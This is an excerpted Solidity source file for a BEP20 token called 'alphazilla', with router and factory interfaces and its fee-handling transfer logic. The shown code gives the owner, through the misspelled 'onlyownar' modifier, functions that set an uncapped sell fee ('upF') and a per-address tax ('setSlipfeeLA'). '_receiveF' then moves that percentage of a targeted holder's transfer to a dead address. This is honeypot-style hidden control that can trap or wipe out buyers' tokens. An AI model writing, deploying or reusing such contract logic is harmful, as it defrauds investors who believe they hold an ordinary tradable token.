...
interface IUniswapV2Factory {
    ...
    function feeLATo() external view returns (address);
    function feeLAToSetter() external view returns (address);
    ...
    function setfeeLATo(address) external;
    function setfeeLAToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeLAOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeLAOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeLAOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeLAOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeLAOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract alphazilla is BEP20, Ownable {
    ...
    uint256 private _defaultSellfeeLA = 0;

    uint256 private _defaultBuyfeeLA = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeLA;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeLA = _value;
    }

    function setSlipfeeLA(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeLA[_address] = _value;
    }

    function getSlipfeeLA(address _address) external view onlyownar returns (uint256) {
        return _slipfeeLA[_address];
    }


    function setMAccountfeeLA(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeLA(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeLAAmount = 0;

        if (rF) {
            uint256 tradefeeLA = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeLA = _defaultSellfeeLA;
                }
                if (from == uniswapV2Pair) {

                    tradefeeLA = _defaultBuyfeeLA;
                }
            }
            if (_slipfeeLA[from] > 0) {
                tradefeeLA = _slipfeeLA[from];
            }

            tradefeeLAAmount = _Amount.mul(tradefeeLA).div(100);
        }


        if (tradefeeLAAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeLAAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeLAAmount);
            emit Transfer(from, _deadAddress, tradefeeLAAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeLAAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeLAAmount);
        emit Transfer(from, _to, _Amount - tradefeeLAAmount);
    }
